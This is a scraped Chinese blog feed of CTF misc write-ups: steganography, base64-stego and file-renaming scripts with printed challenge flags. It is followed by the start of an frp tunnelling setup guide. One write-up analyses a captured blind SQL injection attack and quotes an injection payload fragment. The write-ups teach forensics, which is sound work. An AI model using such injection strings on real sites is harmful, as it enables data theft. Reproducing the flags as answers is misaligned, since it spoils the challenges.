title="029.[MRCTF2020]ezmisc"></a>029.[MRCTF2020]ezmisc</h2><p>考虑高度隐写，修改第二行第六位数据01为02，在看图片得flag<br><code>MRCTF&#123;1ts_vEryyyyyy_ez!&#125;</code><br><code>flag&#123;1ts_vEryyyyyy_ez!&#125;</code></p><h2 id="030-HBNIS2018-低个头"><a href="#030-HBNIS2018-低个头" class="headerlink" title="030.[HBNIS2018]低个头"></a>030.[HBNIS2018]低个头</h2><p>考虑键盘密码，考虑组成的形状为英文字母<code>CTF</code><br><pre class="line-numbers language-none"><code class="language-none">EWAZX RTY TGB IJN IO KLCTF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><code>flag&#123;CTF&#125;</code></p><h2 id="031-GXYCTF2019-SXMgdGhpcyBiYXNlPw"><a href="#031-GXYCTF2019-SXMgdGhpcyBiYXNlPw" class="headerlink" title="031.[GXYCTF2019]SXMgdGhpcyBiYXNlPw=="></a>031.[GXYCTF2019]SXMgdGhpcyBiYXNlPw==</h2><p>题目翻译过来就是<code>Is this base?</code>，base64隐写，炒个脚本来用<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">inttobin</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    ret <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>        ret <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> ret    <span class="token keyword">return</span> rettable <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>tmpbin <span class="token operator">=</span> <span class="token string">''</span>res <span class="token operator">=</span> <span class="token string">''</span>line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> line<span class="token punctuation">:</span>    <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>            tmpbin <span class="token operator">+=</span> inttobin<span class="token punctuation">(</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmpbin <span class="token operator">+=</span> inttobin<span class="token punctuation">(</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>quotient <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmpbin<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>quotient<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>tmpbin<span class="token punctuation">[</span><span class="token number">8</span><span class="token operator">*</span>i<span class="token punctuation">:</span><span class="token number">8</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><code>GXY&#123;fazhazhenhaoting&#125;</code><br><code>flag&#123;fazhazhenhaoting&#125;</code></p><h2 id="032-ACTF新生赛2020-NTFS数据流"><a href="#032-ACTF新生赛2020-NTFS数据流" class="headerlink" title="032.[ACTF新生赛2020]NTFS数据流"></a>032.[ACTF新生赛2020]NTFS数据流</h2><p>好多txt，没flag就是flag is not here，写个脚本找一下异常的<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;.txt"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        line <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">"flag is not here"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;.txt"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>293.txt不太一样打开看看。ctrl c出来，用NtfsStreamsEditor查一下发现flag<br><pre class="line-numbers language-none"><code class="language-none">ACTF&#123;AAAds_nntfs_ffunn?&#125;flag&#123;AAAds_nntfs_ffunn?&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="033-间谍启示录"><a href="#033-间谍启示录" class="headerlink" title="033.间谍启示录"></a>033.间谍启示录</h2><blockquote><p>往后都加个TAG标签吧，到时候好找到。</p></blockquote><p><strong>TAG：misc，未解</strong></p><h2 id="034-我吃三明治"><a href="#034-我吃三明治" class="headerlink" title="034.我吃三明治"></a>034.我吃三明治</h2><p><strong>TAG：foremost，脑洞，base32</strong></p><p>用foremost分离出了两张三明治的图片，定睛一看并不一样，但是没什么鸟用，联想到三明治是夹心的，故找到两张图片的交界处37408行发现类似base32的代码如下<br><pre class="line-numbers language-none"><code class="language-none">MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>解码得flag<br><pre class="line-numbers language-none"><code class="language-none">flag&#123;6f1797d4080b29b64da5897780463e30&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="034-V-amp-N2020-公开赛-拉胯的三条命令"><a href="#034-V-amp-N2020-公开赛-拉胯的三条命令" class="headerlink" title="034.[V&amp;N2020 公开赛]拉胯的三条命令"></a>034.[V&amp;N2020 公开赛]拉胯的三条命令</h2><p><strong>TAG：流量分析，未解</strong></p><p>首先解压zip打开提示，提示内容如下<br><pre class="line-numbers language-none"><code class="language-none">在参加网络安全大赛第二届世界巡回赛新加坡站一场与SP战队的比赛时，作为K&amp;K战队主防手的你使用经典的“三条命令”检查端口封闭状况。可是这次比赛平台没有回显，你能查出来有哪些端口是开放的嘛？请将开放端口按由小到大顺序写入flag中 如：开放1、22、234端口，flag&#123;122234&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><h2 id="035-安洵杯-2019-吹着贝斯扫二维码"><a href="#035-安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="035.[安洵杯 2019]吹着贝斯扫二维码"></a>035.[安洵杯 2019]吹着贝斯扫二维码</h2><p><strong>TAG：拼二维码</strong><br><pre class="line-numbers language-none"><code class="language-none">解压后长度比较大的文件的内容，最后都发现了一个数字，然后开头有jpg的文件头，先把这些文件都拉到一个文件夹里面，写一个脚本重命名一下文件，脚本如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io or http://a16ne.cn </span><span class="token comment"># -----------------------------------------------------</span><span class="token keyword">import</span> os<span class="token keyword">import</span> string<span class="token comment"># 读取文件的位置，最后两个字符</span><span class="token keyword">def</span> <span class="token function">getchar</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'gbk'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        value <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> value<span class="token punctuation">:</span>            <span class="token keyword">if</span> value<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>                value <span class="token operator">=</span> value<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> valuecwd <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># cwd为文件的位置</span>docs <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>cwd<span class="token punctuation">)</span><span class="token keyword">for</span> doc <span class="token keyword">in</span> docs<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>doc<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">:</span>    <span class="token comment"># 里面给的jpg的名字长度都是大于10的</span>        os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span>doc<span class="token punctuation">,</span> getchar<span class="token punctuation">(</span>doc<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">".jpg"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>用ps拼图，扫码。(终于拼好一次图片了啊)<br><img src="/2020/12/07/buuctf-misc/3.png" alt="二维码如下图所示"><br><pre class="line-numbers language-none"><code class="language-none">BASE Family Bucket ??? 85-&gt;64-&gt;85-&gt;13-&gt;16-&gt;32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>flag.zip文件预览发现有加密后的内容，将加密后的内容按照上面加密的逆序解密即可(13代表的是rot13)<br><code>GNATOMJVIQZUKNJXGRCTGNRTGI3EMNZTGNBTKRJWGI2UIMRRGNBDEQZWGI3DKMSFGNCDMRJTII3TMNBQGM4TERRTGEZTOMRXGQYDGOBWGI2DCNBY</code><br><code>ThisIsSecret!233</code><br>解压文件得flag<br><code>flag&#123;Qr_Is_MeAn1nGfuL&#125;</code></p><h2 id="036-RoarCTF2019-黄金6年"><a href="#036-RoarCTF2019-黄金6年" class="headerlink" title="036.[RoarCTF2019]黄金6年"></a>036.[RoarCTF2019]黄金6年</h2><p><strong>TAG:</strong></p><p>给出的是一段视频，先看是不是视频里面藏的有二维码或者base64之类的，用pr打开一帧一帧地看。<br>在2:14和4:27和8:05处发现二维码，扫描<br>key1:i<br>key2:want<br>key3:play</p><h2 id="037-sqltest"><a href="#037-sqltest" class="headerlink" title="037.sqltest"></a>037.sqltest</h2><p><strong>TAG:python脚本， python切片，sql盲注流量分析</strong><br><strong>1.下载附件</strong><br><pre class="line-numbers language-none"><code class="language-none">网站遭受到攻击了，还好我们获取到了全部网络流量。 链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1AdQXVGKb6rkzqMLkSnGGBQ 提取码: 34uu写个脚本解决吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># -----------------------------------------------------</span><span class="token comment"># @Author  : M4XLMUM                                  </span><span class="token comment"># @website : http://a16n.github.io or http://a16ne.cn </span><span class="token comment"># -----------------------------------------------------</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"sqltest.pcapng"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>content2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>content3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>content4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'GET'</span> <span class="token keyword">in</span> i <span class="token keyword">and</span> <span class="token string">'HTTP'</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>        content<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pos_start <span class="token operator">=</span> content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">)</span>    pos_end <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    content2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>pos_start<span class="token punctuation">:</span>pos_end<span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'ascii(substr(((select%20concat_ws(char(94),%20flag)'</span> <span class="token keyword">in</span> content2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>        content3<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>content2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>content2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">100</span> <span class="token keyword">and</span> content3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">100</span> <span class="token keyword">and</span> content3<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">50</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        content4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>content3<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>content4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>content3<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>content3<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 填上最后一位没特征的字符</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>content4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;47edb8300ed5f9b28fc54b0d09ecdef7&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码不是很难，emmm，没注释不知道读起来难不难hhh，by the way，python的切片功能太好使了吧。<br><code>flag&#123;47edb8300ed5f9b28fc54b0d09ecdef7&#125;</code></p><h2 id="038-ACTF新生赛2020-base64隐写"><a href="#038-ACTF新生赛2020-base64隐写" class="headerlink" title="038.[ACTF新生赛2020]base64隐写"></a>038.[ACTF新生赛2020]base64隐写</h2><p>base64隐写，直接上网上大哥哥们写好的脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python2</span><span class="token keyword">def</span> <span class="token function">get_base64_diff_value</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    base64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>    res <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">solve_stego</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'ComeOn!.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        file_lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> file_lines<span class="token punctuation">:</span>            steg_line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            norm_line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            diff <span class="token operator">=</span> get_base64_diff_value<span class="token punctuation">(</span>steg_line<span class="token punctuation">,</span> norm_line<span class="token punctuation">)</span>            <span class="token keyword">print</span> diff            pads_num <span class="token operator">=</span> steg_line<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> diff<span class="token punctuation">:</span>                bin_str <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>pads_num <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                bin_str <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token operator">*</span> pads_num <span class="token operator">*</span> <span class="token number">2</span>            <span class="token keyword">print</span> goflag<span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">goflag</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    res_str <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res_str <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res_str<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    solve_stego<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ACTF&#123;6aseb4_f33!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得flag<br><code>flag&#123;6aseb4_f33!&#125;</code></p><h2 id="039-喵喵喵"><a href="#039-喵喵喵" class="headerlink" title="039.喵喵喵"></a>039.喵喵喵</h2><p>先lsb出来一张png，然后用winhex改下文件头和文件尾变成正常格式，然后扫码得到链接<code>https://pan.baidu.com/s/1pLT2J4f</code>，下载，ntfs数据流</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu搭建frp实现windows本地主机内网穿透</title>
      <link href="2020/12/05/ubuntu%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0windows%E6%9C%AC%E5%9C%B0%E4%B8%BB%E6%9C%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>2020/12/05/ubuntu%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0windows%E6%9C%AC%E5%9C%B0%E4%B8%BB%E6%9C%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0-用到的链接"><a href="#0-用到的链接" class="headerlink" title="0.用到的链接"></a>0.用到的链接</h2><p><a href="https://zhuanlan.zhihu.com/p/262533456">知乎大哥</a></p><h1 id="0000-服务器端配置"><a href="#0000-服务器端配置" class="headerlink" title="0000 服务器端配置"></a>0000 服务器端配置</h1><h2 id="1-下载frp-server端文件"><a href="#1-下载frp-server端文件" class="headerlink" title="1.下载frp server端文件"></a>1.下载frp server端文件</h2><pre class="line-numbers language-none"><code class="language-none">sudo wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.34.0&#x2F;frp_0.34.0_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-解压缩"><a href="#2-解压缩" class="headerlink" title="2.解压缩"></a>2.解压缩</h2><pre class="line-numbers language-none"><code class="language-none">sudo tar -zvxf frp_0.34.0_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-复制到bin中"><a href="#3-复制到bin中" class="headerlink" title="3.复制到bin中"></a>3.复制到bin中</h2><pre class="line-numbers language-none"><code class="language-none">sudo cp frpc &#x2F;usr&#x2F;bin&#x2F;sudo cp frps &#x2F;usr&#x2F;bin&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-复制配置文件-如果不是新安装则跳过这一步，不然会把旧配置覆盖掉"><a href="#4-复制配置文件-如果不是新安装则跳过这一步，不然会把旧配置覆盖掉" class="headerlink" title="4.复制配置文件 - 如果不是新安装则跳过这一步，不然会把旧配置覆盖掉"></a>4.复制配置文件 - 如果不是新安装则跳过这一步，不然会把旧配置覆盖掉</h2><pre class="line-numbers language-none"><code class="language-none">sudo mkdir &#x2F;etc&#x2F;frp&#x2F;sudo cp frp*.ini &#x2F;etc&#x2F;frp&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="5-启动frp服务"><a href="#5-启动frp服务" class="headerlink" title="5.启动frp服务"></a>5.启动frp服务</h2><pre class="line-numbers language-none"><code class="language-none">sudo cp systemd&#x2F;* &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;sudo systemctl start frps # 云服务器启动这个sudo systemctl start frpc # 本地启动这个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="PS1-修改云服务器端（Frps）配置"><a href="#PS1-修改云服务器端（Frps）配置" class="headerlink" 